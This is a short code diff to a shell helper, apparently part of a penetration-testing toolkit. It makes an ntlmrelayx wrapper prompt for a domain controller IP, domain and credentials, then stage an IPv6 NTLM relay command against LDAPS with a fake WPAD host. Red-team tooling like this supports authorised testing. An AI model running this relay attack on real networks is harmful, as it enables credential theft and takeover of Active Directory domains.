@@ -34,5 +34,16 @@ nb-ad-ipv6-install() {
 }
 
 nb-ad-ntlmrelayx() {
-    print -z "ntlmrelayx.py -6 -t ldaps://<TARGET_IP> -wh fakewpad.<DOMAIN>.local -l lootme"
+    __check-project
+	  __check-domain
+	  __ask "Enter the IP address of the target DC server"
+	  nb-vars-set-rhost
+
+
+    __ask "Enter a user account"
+    nb-vars-set-user
+    __ask "Enter a password for authentication"
+    nb-vars-set-pass
+
+    print -z "ntlmrelayx.py -6 -t ldaps://${__RHOST} -wh fakewpad.${__DOMAIN} -l lootme"
 }
